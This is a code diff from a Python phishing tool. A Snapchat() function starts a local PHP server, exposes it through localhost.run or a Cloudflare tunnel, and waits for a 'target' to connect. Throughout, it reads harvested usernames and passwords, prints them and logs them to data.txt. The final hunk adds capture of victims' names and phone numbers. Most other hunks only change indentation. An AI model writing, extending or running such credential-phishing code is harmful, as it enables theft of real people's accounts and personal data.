@@ -2062,48 +2062,48 @@ def Snapchat():
 #====================================================================================================
         try:
             print(f"""\n\r{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
-    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+{Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
 
             link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
             
             if link > 2:
                 exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
                 
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         except EOFError:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         except ValueError:
             exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
             
-    #====================================================================================================
+#====================================================================================================
         try:
             port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
             if port > 65535:
                 exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
 
         
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         except EOFError:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
         except ValueError:
             exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-    #Run Localhost====================================================================================================
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+#Run Localhost====================================================================================================
         php_server()
         
         sleep(1)
         
-    #Run Localhost.run====================================================================================================
+#Run Localhost.run====================================================================================================
 
         if link == 1:
             
@@ -2114,10 +2114,10 @@ def Snapchat():
                 rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
             except KeyboardInterrupt:
                 exit(f"""\n{Fore.YELLOW}│
-        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
                 
             print("                          " , end="\r")
-    #Generate Link====================================================================================================
+#Generate Link====================================================================================================
 
             line = linecache.getline(r"localhost.txt" , 24)
             print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -2126,7 +2126,7 @@ def Snapchat():
             
             Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
             
-    #Run Cloudflare====================================================================================================  
+#Run Cloudflare====================================================================================================  
         if link == 2:
             
             cloudfalre()
@@ -2136,11 +2136,11 @@ def Snapchat():
                 rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
             except KeyboardInterrupt:
                 exit(f"""\n{Fore.YELLOW}│
-        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
                 
             print("                          " , end="\r")
             
-    #Generate Link====================================================================================================
+#Generate Link====================================================================================================
             line = linecache.getline(r"localhost.txt" , 5)
             
             line = line.split()
@@ -2152,7 +2152,7 @@ def Snapchat():
             
             Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
         
-    #Write info====================================================================================================
+#Write info====================================================================================================
         try:
             while True:
                 size = os.stat("info.json")
@@ -2186,9 +2186,9 @@ def Snapchat():
 
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
-    #write username====================================================================================================
+#write username====================================================================================================
         try:
             while True:
                 size = os.stat("username_key.txt")
@@ -2206,7 +2206,7 @@ def Snapchat():
                         open("username_key.txt" , "w").close()
                         
                         break
-    #write password====================================================================================================
+#write password====================================================================================================
 
             while True:
                 size = os.stat("password_key.txt")
@@ -2231,7 +2231,7 @@ def Snapchat():
                         break
         except KeyboardInterrupt:
                 exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     #kill php proccess and exit====================================================================================================
 
         if os.name == "nt":
@@ -2255,48 +2255,48 @@ def Snapchat():
 #====================================================================================================
         try:
             print(f"""\n\r{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
-    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+{Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
 
             link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
             
             if link > 2:
                 exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid number ! Must be 1 or 2""")
                 
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         except EOFError:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         except ValueError:
             exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Number !""")
             
-    #====================================================================================================
+#====================================================================================================
         try:
             port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
             if port > 65535:
                 exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
 
         
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         except EOFError:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
         except ValueError:
             exit(f"""{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-    #Run Localhost====================================================================================================
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+#Run Localhost====================================================================================================
         php_server()
         
         sleep(1)
         
-    #Run Localhost.run====================================================================================================
+#Run Localhost.run====================================================================================================
 
         if link == 1:
             
@@ -2307,10 +2307,10 @@ def Snapchat():
                 rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
             except KeyboardInterrupt:
                 exit(f"""\n{Fore.YELLOW}│
-        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
                 
             print("                          " , end="\r")
-    #Generate Link====================================================================================================
+#Generate Link====================================================================================================
 
             line = linecache.getline(r"localhost.txt" , 24)
             print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
@@ -2319,7 +2319,7 @@ def Snapchat():
             
             Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
             
-    #Run Cloudflare====================================================================================================  
+#Run Cloudflare====================================================================================================  
         if link == 2:
             
             cloudfalre()
@@ -2329,11 +2329,11 @@ def Snapchat():
                 rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
             except KeyboardInterrupt:
                 exit(f"""\n{Fore.YELLOW}│
-        ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
                 
             print("                          " , end="\r")
             
-    #Generate Link====================================================================================================
+#Generate Link====================================================================================================
             line = linecache.getline(r"localhost.txt" , 5)
             
             line = line.split()
@@ -2345,7 +2345,7 @@ def Snapchat():
             
             Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
         
-    #Write info====================================================================================================
+#Write info====================================================================================================
         try:
             while True:
                 size = os.stat("info.json")
@@ -2379,9 +2379,9 @@ def Snapchat():
 
         except KeyboardInterrupt:
             exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
         
-    #write username====================================================================================================
+#write username====================================================================================================
         try:
             while True:
                 size = os.stat("username_key.txt")
@@ -2399,14 +2399,14 @@ def Snapchat():
                         open("username_key.txt" , "w").close()
                         
                         break
-    #write password====================================================================================================
+#write password====================================================================================================
 
             while True:
                 size = os.stat("password_key.txt")
                 if size.st_size != 0:
                     with open("password_key.txt" , "r") as pas:
                         sleep(15)
-                        print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                        print(f"\r\n{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                         #clear password.txt
                         pwd =open("password_key.txt")  
@@ -2418,13 +2418,36 @@ def Snapchat():
                         sleep(1.5)
                         open("password_key.txt" , "w").close()
                         
+                        
+                    sleep(20)                        
+                    with open("name.txt" , "r") as name:
+                        sleep(2)
+ 
+                        data = open("data.txt","a")
+                        for x in name.readlines():
+                            data.write(f"\nVictim name is : {x}")
+                        sleep(1.5)
+                        open("name.txt" , "w").close()
+                        
+                    sleep(0.5)
+                    with open("number.txt" , "r") as num:
+                        sleep(1)
+                    
+                        print(f"\r\n{Fore.GREEN}User Number is : {Fore.LIGHTWHITE_EX}" , num.read())
+                        data = open("data.txt","a")
+                        for x in num.readlines():
+                            data.write(f"\nVictim Number is : {x}")
+                        sleep(1.5)
+                        open("number.txt" , "w").close()
+                                                
+                                                
                         sleep(0.5)
-                        print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                        print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other Info saved in data.txt" + Fore.RESET)
 
                         break
         except KeyboardInterrupt:
                 exit(f"""\n{Fore.YELLOW}│
-    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     #kill php proccess and exit====================================================================================================
 
         if os.name == "nt":
